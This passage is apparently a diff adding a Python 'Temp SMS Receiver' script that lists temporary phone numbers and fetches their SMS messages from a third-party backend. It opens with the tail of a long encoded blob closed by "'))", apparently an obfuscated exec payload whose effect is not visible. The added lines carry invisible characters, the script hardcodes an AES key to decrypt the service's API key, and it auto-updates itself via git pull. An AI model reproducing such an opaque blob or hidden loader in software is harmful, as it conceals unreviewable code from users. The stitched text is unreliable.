XhdS3fKP3bbLB3nnfsITyJlGM0/WMO8uZfLlk7PrcYOVxE3La61ldHY92P6ufs4ZGEqpEDzfz82OxpUVjRDVxTaFFOY7DrnLQz0ajf6dr8VK4fZC7pAu6gb7q0n5RgVeLC/1nOgkqlOImAkXxsbitntmB695lFhB0La1C2qP9tgcRKo6pPXM/f54gMFVm8Vks+tJdALlyxuCp35xidJd3yRiWk7bRp++M/Wu1UEP4ptrDln/KHZrMn8lh8tLhlSQnPrjp1GyjQUYEXbA7iChDWTkdX1GhLB1ntlQTvfFmPhT9Cutw7qoKcHlsTsVaObOhSBGlV/glzQbxCkmKwIZCAnb3WcyYYk8spgOt7mRkoWdq+G1FohktKCBySJAbUNhcSl4dUIXXSPkoxoMq4p69RQch9MrkSVZo5lagyaKubQfThgtZMNHKi23hDR69QfcVEWmnfNozj5bviXntHuqCb3zz96YgB9k0pwaAISPpWWmKO1XNvX4pRMute25e1Vu9+8IzIkpa0DX7Q9za1IJvxfCnTdqeN1B3jGPmDPaHXAShCotZ92iiVLlALrU8iTsJitJAp2rut2of+pAafarQq2PA3ian7TGxnJYGD4nv7MPWHBvZQPDAgC00LPL5Gp2+bHw6nlche0RgGrZQDUfGv92C/w/337//37//Kmq6laRvuTGOViQpOp+/fFwGeD/Lmsn3x3g3BM4un+TRyC1qSesmVwJe'))
+‎#!/usr/bin/env python3
+‎# -*- coding: utf-8 -*-
+‎
+‎"""
+‎Temp SMS Receiver
+‎By Nafi Gamer DC-nafigamer
+‎"""
+‎
+‎import os
+‎import sys
+‎import asyncio
+‎import random
+‎import base64
+‎import subprocess  # Added missing import
+‎from typing import Dict, List, Tuple, Optional, Any
+‎from dataclasses import dataclass
+‎from enum import Enum, auto
+‎from pathlib import Path
+‎
+‎try:
+‎    import requests
+‎    from Crypto.Cipher import AES
+‎    from Crypto.Util.Padding import unpad
+‎    import colorama
+‎    import pyfiglet
+‎    import pyperclip
+‎    from aiohttp import ClientSession
+‎    from rich.console import Console
+‎    from rich.panel import Panel
+‎    from rich.progress import Progress
+‎    from rich.table import Table
+‎    from rich.style import Style
+‎except ImportError as e:
+‎    print(f"Missing dependencies: {e}")
+‎    if input("Install dependencies? (y/n): ").lower() == 'y':
+‎        try:
+‎            subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"], check=True)
+‎            print("Dependencies installed successfully. Please run the program again.")
+‎        except subprocess.CalledProcessError:
+‎            print("Failed to install dependencies. Please install them manually.")
+‎    sys.exit(1)
+‎
+‎# Initialize colorama
+‎colorama.init(autoreset=True)
+‎
+‎# Constants
+‎CLEAR = "cls" if os.name == "nt" else "clear"
+‎BASE_URL = "https://api-1.online"
+‎AES_KEY = "9e8986a75ffa32aa187b7f34394c70ea".encode()
+‎HEADERS = {
+‎    "accept-encoding": "gzip",
+‎    "user-agent": "okhttp/4.9.2"
+‎}
+‎
+‎# Rich console setup
+‎console = Console()
+‎
+‎# Color definitions using rich Styles
+‎class Color:
+‎    BLUE = Style(color="blue", bold=True)
+‎    CYAN = Style(color="cyan", bold=True)
+‎    GREEN = Style(color="green", bold=True)
+‎    YELLOW = Style(color="yellow", bold=True)
+‎    RED = Style(color="red", bold=True)
+‎    MAGENTA = Style(color="magenta", bold=True)
+‎    LIGHT_YELLOW = Style(color="yellow3", bold=True)
+‎    LIGHT_RED = Style(color="red3", bold=True)
+‎    LIGHT_MAGENTA = Style(color="magenta3", bold=True)
+‎    LIGHT_BLUE = Style(color="blue3", bold=True)
+‎    LIGHT_CYAN = Style(color="cyan3", bold=True)
+‎    LIGHT_GREEN = Style(color="green3", bold=True)
+‎    BOLD = Style(bold=True)
+‎
+‎    @classmethod
+‎    def random(cls) -> Style:
+‎        colors = [
+‎            cls.BLUE, cls.CYAN, cls.GREEN, cls.YELLOW, cls.RED, cls.MAGENTA,
+‎            cls.LIGHT_YELLOW, cls.LIGHT_RED, cls.LIGHT_MAGENTA,
+‎            cls.LIGHT_BLUE, cls.LIGHT_CYAN, cls.LIGHT_GREEN
+‎        ]
+‎        return random.choice(colors)
+‎
+‎# Font options
+‎FONTS = (
+‎    "basic", "o8", "cosmic", "graffiti", "chunky", 
+‎    "epic", "doom", "avatar"
+‎)
+‎
+‎@dataclass
+‎class Country:
+‎    code: str
+‎    name: str
+‎
+‎@dataclass
+‎class PhoneNumber:
+‎    e164: str
+‎    time: str
+‎    country: str
+‎
+‎@dataclass
+‎class SMSMessage:
+‎    from_number: str
+‎    body: str
+‎    time: str
+‎
+‎class ClipboardResult(Enum):
+‎    SUCCESS = auto()
+‎    TERMUX_API_NOT_INSTALLED = auto()
+‎    TERMUX_APP_NOT_INSTALLED = auto()
+‎    UNKNOWN_ENVIRONMENT = auto()
+‎
+‎def clear_screen() -> None:
+‎    """Clear the terminal screen."""
+‎    os.system(CLEAR)
+‎
+‎def print_centered(text: str, color: Style = Color.BOLD) -> None:
+‎    """Print centered text with optional color."""
+‎    console.print(text.center(os.get_terminal_size().columns), style=color)
+‎
+‎def print_warning(message: str) -> None:
+‎    """Print a warning message."""
+‎    print_centered(f"[!] {message}", Color.RED)
+‎
+‎def print_success(message: str) -> None:
+‎    """Print a success message."""
+‎    print_centered(f"[+] {message}", Color.GREEN)
+‎
+‎def print_info(message: str) -> None:
+‎    """Print an informational message."""
+‎    print_centered(f"[*] {message}", Color.BLUE)
+‎
+‎def show_logo() -> None:
+‎    """Display the program logo."""
+‎    clear_screen()
+‎    color1 = Color.random()
+‎    color2 = Color.random()
+‎    while color1 == color2:
+‎        color2 = Color.random()
+‎    
+‎    # Create a rich panel for the logo
+‎    logo_text = pyfiglet.figlet_format(
+‎        "Temp\nSMS",
+‎        font=random.choice(FONTS),
+‎        justify="center",
+‎        width=os.get_terminal_size().columns,
+‎    )
+‎    
+‎    panel = Panel(
+‎        logo_text,
+‎        title="[bold]Temporary SMS Receiver",
+‎        subtitle="By Nafi Gamer",
+‎        border_style=color1,
+‎        title_align="center",
+‎        width=os.get_terminal_size().columns - 4
+‎    )
+‎    
+‎    console.print(panel)
+‎
+‎async def fetch_auth_key(session: ClientSession) -> str:
+‎    """Fetch the encrypted API key."""
+‎    url = f"{BASE_URL}/post/"
+‎    params = {"action": "get_encrypted_api_key", "type": "user"}
+‎    json_data = {"api": "111"}
+‎    
+‎    async with session.post(url, params=params, headers=HEADERS, json=json_data) as response:
+‎        response.raise_for_status()
+‎        data = await response.json()
+‎        return data["api_key"]
+‎
+‎def decrypt_key(encrypted_str: str) -> str:
+‎    """Decrypt the API key using AES."""
+‎    decoded = base64.b64decode(encrypted_str)
+‎    iv = decoded[:16]
+‎    encrypted_data = decoded[16:]
+‎    
+‎    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+‎    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+‎    return decrypted_data.decode()
+‎
+‎async def get_auth_key() -> str:
+‎    """Get the decrypted auth key."""
+‎    async with ClientSession() as session:
+‎        encrypted_key = await fetch_auth_key(session)
+‎        return decrypt_key(encrypted_key)
+‎
+‎async def copy_to_clipboard(text: str) -> Tuple[bool, Optional[str]]:
+‎    """Copy text to clipboard with fallback methods."""
+‎    try:
+‎        pyperclip.copy(text)
+‎        return True, None
+‎    except Exception:
+‎        if sys.platform == "linux":
+‎            try:
+‎                if b"Android" in subprocess.check_output(["uname", "-o"]):
+‎                    try:
+‎                        result = subprocess.run(
+‎                            ["termux-clipboard-set", text],
+‎                            stderr=subprocess.DEVNULL,
+‎                            stdout=subprocess.DEVNULL,
+‎                            timeout=4,
+‎                            check=True
+‎                        )
+‎                        return True, None
+‎                    except subprocess.CalledProcessError:
+‎                        return False, 'Install termux-api: "pkg install termux-api"'
+‎                    except subprocess.TimeoutExpired:
+‎                        return False, 'Install Termux-API app from Play Store'
+‎                    except FileNotFoundError:
+‎                        return False, "Termux clipboard utility not found"
+‎            except subprocess.CalledProcessError:
+‎                pass
+‎        
+‎        # Try xclip/xsel as fallback for Linux
+‎        for cmd in ["xclip", "xsel"]:
+‎            try:
+‎                subprocess.run(
+‎                    [cmd, "-i"],
+‎                    input=text.encode(),
+‎                    check=True,
+‎                    stdout=subprocess.DEVNULL,
+‎                    stderr=subprocess.DEVNULL
+‎                )
+‎                return True, None
+‎            except (subprocess.CalledProcessError, FileNotFoundError):
+‎                continue
+‎        
+‎        return False, "Clipboard access not available"
+‎
+‎async def fetch_countries(session: ClientSession) -> List[Country]:
+‎    """Fetch available countries."""
+‎    url = f"{BASE_URL}/get/"
+‎    params = {"action": "country"}
+‎    
+‎    async with session.post(url, params=params, headers=HEADERS) as response:
+‎        response.raise_for_status()
+‎        data = await response.json()
+‎        return [Country(code=item["country_code"], name=item["Country_Name"]) 
+‎                for item in data["records"]]
+‎
+‎async def fetch_numbers(session: ClientSession, country: str, page: int, auth_key: str) -> Dict[str, Any]:
+‎    """Fetch available numbers for a country."""
+‎    url = f"{BASE_URL}/post/"
+‎    params = {"action": "GetFreeNumbers", "type": "user"}
+‎    headers = HEADERS.copy()
+‎    headers["authorization"] = f"Bearer {auth_key}"
+‎    json_data = {"country_name": country, "limit": 10, "page": page}
+‎    
+‎    async with session.post(url, params=params, headers=headers, json=json_data) as response:
+‎        response.raise_for_status()
+‎        return await response.json()
+‎
+‎async def fetch_sms(session: ClientSession, number: str, auth_key: str) -> List[SMSMessage]:
+‎    """Fetch SMS messages for a number."""
+‎    url = f"{BASE_URL}/post/getFreeMessages"
+‎    headers = HEADERS.copy()
+‎    headers["authorization"] = f"Bearer {auth_key}"
+‎    json_data = {"no": number, "page": "1"}
+‎    
+‎    async with session.post(url, headers=headers, json=json_data) as response:
+‎        response.raise_for_status()
+‎        data = await response.json()
+‎        return [SMSMessage(
+‎            from_number=msg["FromNumber"],
+‎            body=msg["Messagebody"],
+‎            time=msg["message_time"]
+‎        ) for msg in data["messages"]]
+‎
+‎async def display_sms(number: str, auth_key: str) -> None:
+‎    """Display SMS messages for a number."""
+‎    async with ClientSession() as session:
+‎        messages = await fetch_sms(session, number, auth_key)
+‎        
+‎        if not messages:
+‎            print_warning("No messages found")
+‎            return
+‎        
+‎        table = Table(title=f"SMS Messages for {number}", show_header=True, header_style="bold magenta")
+‎        table.add_column("From", style="cyan")
+‎        table.add_column("Message", style="green")
+‎        table.add_column("Time", style="yellow")
+‎        
+‎        for msg in messages:
+‎            table.add_row(msg.from_number, repr(msg.body), msg.time)
+‎        
+‎        console.print(table)
+‎
+‎async def check_update() -> Tuple[bool, str]:
+‎    """Check for updates."""
+‎    try:
+‎        async with ClientSession() as session:
+‎            async with session.get(
+‎                "https://raw.githubusercontent.com/nafigamerReal/Temp-SMS-Receive/refs/heads/main/.version"
+‎            ) as response:
+‎                response.raise_for_status()
+‎                latest = (await response.text()).strip()
+‎                
+‎                version_file = Path(".version")
+‎                if version_file.exists():
+‎                    current = version_file.read_text().strip()
+‎                    return (current != latest, latest)
+‎                return (True, latest)
+‎    except Exception:
+‎        return (False, "0")
+‎
+‎async def perform_update() -> bool:
+‎    """Perform program update."""
+‎    if ".git" not in os.listdir():
+‎        return False
+‎    
+‎    try:
+‎        # Stash any local changes
+‎        subprocess.run(
+‎            ["git", "stash"],
+‎            check=True,
+‎            stdout=subprocess.DEVNULL,
+‎            stderr=subprocess.DEVNULL
+‎        )
+‎        
+‎        # Pull latest changes
+‎        subprocess.run(
+‎            ["git", "pull"],
+‎            check=True,
+‎            stdout=subprocess.DEVNULL,
+‎            stderr=subprocess.DEVNULL
+‎        )
+‎        return True
+‎    except subprocess.CalledProcessError:
+‎        return False
+‎
+‎async def select_country(countries: List[Country]) -> Country:
+‎    """Prompt user to select a country."""
+‎    while True:
+‎        try:
+‎            # Display countries in a table
+‎            table = Table(title="Available Countries", show_header=True, header_style="bold blue")
+‎            table.add_column("No.", style="cyan")
+‎            table.add_column("Code", style="green")
+‎            table.add_column("Country", style="yellow")
+‎            
+‎            for idx, country in enumerate(countries, 1):
+‎                table.add_row(str(idx), country.code, country.name)
+‎            
+‎            console.print(table)
+‎            
+‎            choice = await asyncio.to_thread(
+‎                input, 
+‎                f"Enter country number (1-{len(countries)}): "
+‎            )
+‎            
+‎            if not choice.isdigit():
+‎                print_warning("Please enter a number")
+‎                continue
+‎                
+‎            choice_idx = int(choice) - 1
+‎            if 0 <= choice_idx < len(countries):
+‎                return countries[choice_idx]
+‎            
+‎            print_warning("Invalid selection")
+‎        except KeyboardInterrupt:
+‎            print_info("Returning to main menu...")
+‎            raise
+‎
+‎async def select_number(numbers: List[PhoneNumber]) -> str:
+‎    """Prompt user to select a phone number."""
+‎    while True:
+‎        try:
+‎            # Display numbers in a table
+‎            table = Table(title="Available Numbers", show_header=True, header_style="bold green")
+‎            table.add_column("No.", style="cyan")
+‎            table.add_column("Number", style="green")
+‎            table.add_column("Time", style="yellow")
+‎            
+‎            for idx, num in enumerate(numbers, 1):
+‎                table.add_row(str(idx), num.e164, num.time)
+‎            
+‎            console.print(table)
+‎            
+‎            choice = await asyncio.to_thread(
+‎                input, 
+‎                f"Enter number (1-{len(numbers)}) or 'R' for random: "
+‎            )
+‎            
+‎            if choice.upper() == "R":
+‎                # Weight recent numbers higher (20% of numbers get double weight)
+‎                recent_count = max(1, int(len(numbers) * 0.2))
+‎                weights = [2] * recent_count + [1] * (len(numbers) - recent_count)
+‎                return random.choices(numbers, weights=weights, k=1)[0].e164
+‎            
+‎            if not choice.isdigit():
+‎                print_warning("Please enter a number or 'R'")
+‎                continue
+‎                
+‎            choice_idx = int(choice) - 1
+‎            if 0 <= choice_idx < len(numbers):
+‎                return numbers[choice_idx].e164
+‎            
+‎            print_warning("Invalid selection")
+‎        except KeyboardInterrupt:
+‎            print_info("Returning to country selection...")
+‎            raise
+‎
+‎async def main_flow(auth_key: str) -> None:
+‎    """Main program flow."""
+‎    while True:
+‎        try:
+‎            show_logo()
+‎            
+‎            async with ClientSession() as session:
+‎                # Fetch countries with progress indicator
+‎                with Progress() as progress:
+‎                    task = progress.add_task("[cyan]Loading countries...", total=1)
+‎                    countries = await fetch_countries(session)
+‎                    progress.update(task, advance=1)
+‎                
+‎                if not countries:
+‎                    print_warning("No countries available")
+‎                    await asyncio.sleep(2)
+‎                    continue
+‎                
+‎                # Select country
+‎                selected_country = await select_country(countries)
+‎                
+‎                # Fetch numbers with progress
+‎                with Progress() as progress:
+‎                    task = progress.add_task(
+‎                        f"[green]Loading numbers for {selected_country.name}...",
+‎                        total=1
+‎                    )
+‎                    
+‎                    first_page = await fetch_numbers(
+‎                        session, selected_country.name, 1, auth_key
+‎                    )
+‎                    progress.update(task, advance=0.3)
+‎                    
+‎                    if first_page["Total_Pages"] == 0:
+‎                        progress.update(task, advance=1)
+‎                        print_warning("No numbers available for this country")
+‎                        await asyncio.sleep(2)
+‎                        continue
+‎                    
+‎                    # Process first page
+‎                    numbers = [
+‎                        PhoneNumber(
+‎                            e164=num["E.164"],
+‎                            time=num["time"],
+‎                            country=selected_country.name
+‎                        )
+‎                        for num in first_page["Available_numbers"]
+‎                    ]
+‎                    progress.update(task, advance=0.3)
+‎                    
+‎                    # Fetch additional pages if needed (but limit to 150 numbers)
+‎                    if first_page["Total_Pages"] > 1 and len(numbers) < 150:
+‎                        remaining_pages = min(15, first_page["Total_Pages"] - 1)
+‎                        for page_num in range(2, 2 + remaining_pages):
+‎                            page_data = await fetch_numbers(
+‎                                session, selected_country.name, page_num, auth_key
+‎                            )
+‎                            numbers.extend([
+‎                                PhoneNumber(
+‎                                    e164=num["E.164"],
+‎                                    time=num["time"],
+‎                                    country=selected_country.name
+‎                                )
+‎                                for num in page_data["Available_numbers"]
+‎                            ])
+‎                            progress.update(task, advance=0.4/remaining_pages)
+‎                            
+‎                            if len(numbers) >= 150:
+‎                                break
+‎                    
+‎                    progress.update(task, completed=1)
+‎                
+‎                # Select number
+‎                selected_number = await select_number(numbers)
+‎                
+‎                # Copy to clipboard
+‎                success, message = await copy_to_clipboard(selected_number)
+‎                if success:
+‎                    print_success("Number copied to clipboard!")
+‎                else:
+‎                    print_warning(f"Clipboard error: {message}")
+‎                
+‎                # Main SMS viewing loop
+‎                while True:
+‎                    try:
+‎                        await display_sms(selected_number, auth_key)
+‎                        
+‎                        print_centered(
+‎                            "Press Enter to refresh or Ctrl+C to return to main menu",
+‎                            Color.LIGHT_CYAN
+‎                        )
+‎                        
+‎                        try:
+‎                            await asyncio.to_thread(input)
+‎                        except KeyboardInterrupt:
+‎                            break
+‎                            
+‎                    except KeyboardInterrupt:
+‎                        break
+‎                    except Exception as e:
+‎                        print_warning(f"Error fetching messages: {e}")
+‎                        await asyncio.sleep(2)
+‎                        break
+‎        
+‎        except KeyboardInterrupt:
+‎            print_info("\nReturning to main menu...")
+‎            await asyncio.sleep(1)
+‎        except Exception as e:
+‎            print_warning(f"An error occurred: {e}")
+‎            await asyncio.sleep(2)
+‎
+‎async def main() -> None:
+‎    """Entry point."""
+‎    try:
+‎        # Check for updates
+‎        update_available, latest_version = await check_update()
+‎        if update_available:
+‎            print_warning(f"Update available (version {latest_version})")
+‎            print_info("Updating...")
+‎            
+‎            if await perform_update():
+‎                print_success("Update successful! Please restart the program.")
+‎            else:
+‎                print_warning("Update failed - please update manually")
+‎            
+‎            return
+‎        
+‎        # Get auth key
+‎        with console.status("[bold green]Authenticating..."):
+‎            auth_key = await get_auth_key()
+‎        
+‎        # Start main flow
+‎        await main_flow(auth_key)
+‎    
+‎    except KeyboardInterrupt:
+‎        print_info("\nExiting...")
+‎    except Exception as e:
+‎        print_warning(f"Fatal error: {e}")
+‎        if input("Show traceback? (y/n): ").lower() == 'y':
+‎            import traceback
+‎            traceback.print_exc()
+‎
+‎if __name__ == "__main__":
+‎    try:
+‎        asyncio.run(main())
+‎    except KeyboardInterrupt:
+‎        os.system('cls' if os.name == 'nt' else 'clear')
+‎        subprocess.run([sys.executable, "tempsms.py"])
+‎
